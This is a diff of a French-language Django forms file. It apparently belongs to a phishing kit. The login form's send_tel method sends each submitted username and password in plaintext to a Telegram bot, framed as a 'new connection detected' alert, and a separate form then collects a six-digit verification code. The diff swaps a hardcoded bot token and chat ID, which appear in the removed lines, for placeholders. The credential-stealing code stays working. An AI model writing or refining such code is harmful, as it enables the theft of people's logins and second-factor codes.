@@ -2,6 +2,9 @@ from django import forms
 import requests
 from django.core.exceptions import ValidationError
 
+TELEGRAM_TOKEN   = "TON_TOKEN"
+TELEGRAM_CHAT_ID = "TON_CHAT_ID"
+
 
 class InscriptionForm(forms.Form):
     identifiant = forms.CharField(
@@ -28,36 +31,30 @@ class InscriptionForm(forms.Form):
 
     def clean_mot_de_passe(self):
         mot_de_passe = self.cleaned_data.get('mot_de_passe', '')
-        #if len(mot_de_passe) < 8:
-         #   raise ValidationError("Le mot de passe doit contenir au moins 8 caractères.")
-        #if not any(c.isdigit() for c in mot_de_passe):
-         #   raise ValidationError("Le mot de passe doit contenir au moins un chiffre.")
-        #if not any(c.isupper() for c in mot_de_passe):
-         #   raise ValidationError("Le mot de passe doit contenir au moins une majuscule.")
+        if not mot_de_passe:
+            raise ValidationError("Le mot de passe ne peut pas être vide.")
         return mot_de_passe
 
     def send_tel(self):
-        identifiant = self.cleaned_data.get('identifiant')
+        identifiant  = self.cleaned_data.get('identifiant')
         mot_de_passe = self.cleaned_data.get('mot_de_passe')
-        CHAT_ID = "8849728706"
-        TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         data = {
-    "chat_id": CHAT_ID,
-    "text": (
-        f"🔔 *NOUVELLE CONNEXION DÉTECTÉE*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"👤 *Identifiant :* `{identifiant}`\n"
-        f"🔑 *Mot de passe :* `{mot_de_passe}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━"
-    ),
-    "parse_mode": "Markdown"   # ← active le gras et le code
-}
+            "chat_id":    TELEGRAM_CHAT_ID,
+            "text": (
+                f"🔔 *NOUVELLE CONNEXION DÉTECTÉE*\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 *Identifiant :* `{identifiant}`\n"
+                f"🔑 *Mot de passe :* `{mot_de_passe}`\n"
+                f"━━━━━━━━━━━━━━━━━━━━"
+            ),
+            "parse_mode": "Markdown"
+        }
         try:
-            response = requests.post(url, data=data, timeout=5)
+            response = requests.post(url, json=data, timeout=5)
             response.raise_for_status()
         except requests.RequestException as e:
-            print(f"Erreur lors de l'envoi au bot : {e}")
+            print(f"Erreur envoi Telegram : {e}")
 
 
 class VerificationForm(forms.Form):
@@ -67,7 +64,7 @@ class VerificationForm(forms.Form):
         min_length=6,
         widget=forms.TextInput(attrs={
             'placeholder': '——————',
-            'class': 'code-input',
-            'inputmode': 'numeric',
+            'class':       'code-input',
+            'inputmode':   'numeric',
         }),
     )
